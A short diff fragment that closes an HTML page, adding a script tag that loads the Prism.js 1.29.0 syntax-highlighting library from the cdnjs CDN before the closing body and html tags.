+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+</body>
+</html>
